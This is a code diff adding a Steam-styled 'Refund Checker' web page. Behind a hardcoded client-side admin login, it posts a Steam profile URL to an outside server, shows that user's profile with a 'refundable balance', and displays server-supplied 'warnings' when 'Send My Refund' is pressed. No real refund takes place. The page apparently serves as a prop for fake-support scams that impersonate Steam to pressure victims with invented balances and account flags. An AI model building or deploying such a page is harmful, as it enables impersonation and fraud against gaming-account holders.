@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Steam Refund Checker</title>
+  <style>
+    * { box-sizing: border-box; }
+    html, body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', sans-serif;
+      height: 100%;
+      background: url('https://images7.alphacoders.com/695/695357.jpg') no-repeat center center fixed;
+      background-size: cover;
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .container {
+      background: rgba(26, 40, 56, 0.95);
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.6);
+      backdrop-filter: blur(6px);
+      margin: 20px;
+    }
+
+    #login-section {
+      max-width: 400px;
+      width: 100%;
+    }
+
+    #search-section {
+      max-width: 1200px;
+      width: 100%;
+      display: none;
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    input[type="text"], input[type="password"], button {
+      width: 100%;
+      padding: 12px;
+      border-radius: 8px;
+      border: none;
+      margin-bottom: 15px;
+      font-size: 16px;
+    }
+
+    button {
+      background: #66c0f4;
+      color: #000;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background: #a1d9ff;
+    }
+
+    #balance-section {
+      background: #171a21;
+      padding: 15px;
+      border-radius: 8px;
+      text-align: center;
+      margin-bottom: 20px;
+      color: #66c0f4;
+      font-size: 18px;
+    }
+
+    #search-controls {
+      margin-bottom: 20px;
+    }
+
+    .steam-profile-card {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 20px;
+      background: linear-gradient(135deg, #1b2838, #2a475e);
+      padding: 20px;
+      border-radius: 12px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4);
+    }
+
+    .steam-avatar {
+      width: 120px;
+      height: 120px;
+      border-radius: 12px;
+      border: 3px solid #66c0f4;
+      object-fit: cover;
+    }
+
+    .steam-details {
+      flex: 1;
+    }
+
+    .steam-details h3 {
+      margin: 0;
+      font-size: 24px;
+      color: #c7d5e0;
+    }
+
+    .steam-location {
+      color: #aaa;
+      font-size: 14px;
+      margin-top: 5px;
+    }
+
+    .steam-level-badge {
+      background: #171a21;
+      padding: 10px 20px;
+      border-radius: 10px;
+      text-align: center;
+      color: #66c0f4;
+      font-weight: bold;
+    }
+
+    .steam-level-badge .level-number {
+      font-size: 22px;
+      color: #fff;
+    }
+
+    #login-error {
+      color: red;
+      text-align: center;
+      font-size: 14px;
+      margin-top: -10px;
+      margin-bottom: 10px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container" id="login-section">
+  <h2>Refund Tracker</h2>
+  <input type="text" id="username" placeholder="Username" />
+  <input type="password" id="password" placeholder="Password" />
+  <p id="login-error"></p>
+  <button onclick="login()">Login</button>
+</div>
+
+<div class="container" id="search-section">
+  <h2>Steam Refund Checker</h2>
+
+  <div id="balance-section" style="display: none;">
+    <strong>Current Refundable Balance:</strong> <span id="balance">$0</span><br /><br />
+    <button onclick="sendRefund()">Send My Refund</button>
+  </div>
+
+  <div id="search-controls">
+    <input type="text" id="steam-url" placeholder="Enter Steam Profile URL" />
+    <button onclick="submitSteam()">Submit</button>
+  </div>
+
+  <div class="steam-profile-card" id="steam-info" style="display: none;">
+    <img id="steam-avatar" class="steam-avatar" src="" alt="Avatar" />
+    <div class="steam-details">
+      <h3 id="steam-name"></h3>
+      <p id="steam-location" class="steam-location"></p>
+    </div>
+    <div class="steam-level-badge">
+      Level
+      <div id="steam-level" class="level-number"></div>
+    </div>
+  </div>
+</div>
+
+<script>
+  function login() {
+    const username = document.getElementById('username').value.trim();
+    const password = document.getElementById('password').value.trim();
+    if (username === 'ADMINISTRATOR_SUPPORT' && password === 'STEAMPROCESS') {
+      document.getElementById('login-section').style.display = 'none';
+      document.getElementById('search-section').style.display = 'block';
+    } else {
+      document.getElementById('login-error').innerText = 'Incorrect username or password.';
+    }
+  }
+
+  async function submitSteam() {
+    const url = document.getElementById('steam-url').value;
+    try {
+      const res = await fetch('https://addfunds.onrender.com/api/steam-info', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ steamUrl: url })
+      });
+
+      if (!res.ok) throw new Error();
+
+      const data = await res.json();
+      window.lastSteamId = data.steamId;
+
+      document.getElementById('steam-name').innerText = data.personaName;
+      document.getElementById('steam-avatar').src = data.avatar;
+      document.getElementById('steam-level').innerText = data.level;
+      document.getElementById('steam-location').innerText = data.loccountrycode || '';
+      document.getElementById('balance').innerText = `$${data.balance}`;
+      document.getElementById('steam-info').style.display = 'flex';
+      document.getElementById('balance-section').style.display = 'block';
+      document.getElementById('search-controls').style.display = 'none';
+    } catch (err) {
+      alert('Failed to fetch Steam info. Please check the URL.');
+    }
+  }
+
+  async function sendRefund() {
+    const steamId = window.lastSteamId;
+    if (!steamId) return;
+    try {
+      await fetch('https://addfunds.onrender.com/api/get-warning', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ steamId })
+      });
+    } catch (err) {
+      console.error('Refund request failed.');
+    }
+  }
+</script>
+
+
+<!-- Warning Modal -->
+<div id="warning-modal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.6); z-index:999; align-items:center; justify-content:center;">
+  <div style="background:white; color:#000; padding:30px; border-radius:10px; text-align:center; max-width:400px; width:90%;">
+    <h2 style="color:#d9534f;">⚠️ Warning</h2>
+    <p id="warning-text"></p>
+    <button onclick="closeWarning()" style="margin-top:20px; padding:10px 20px; background:#d9534f; color:white; border:none; border-radius:5px; cursor:pointer;">Close</button>
+  </div>
+</div>
+<script>
+  function showWarning(message) {
+    document.getElementById('warning-text').innerText = message;
+    document.getElementById('warning-modal').style.display = 'flex';
+  }
+
+  function closeWarning() {
+    document.getElementById('warning-modal').style.display = 'none';
+  }
+
+  async function sendRefund() {
+    const steamId = window.lastSteamId;
+    if (!steamId) return;
+
+    try {
+      const res = await fetch('https://addfunds.onrender.com/api/get-warning', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ steamId })
+      });
+
+      const data = await res.json();
+
+      if (data.warning && data.warning.trim() !== '') {
+        showWarning(data.warning);
+      } else {
+        showWarning('No warnings found. Refund request received.');
+      }
+    } catch (err) {
+      showWarning('Failed to contact server.');
+    }
+  }
+</script>
+
+</body>
+</html>
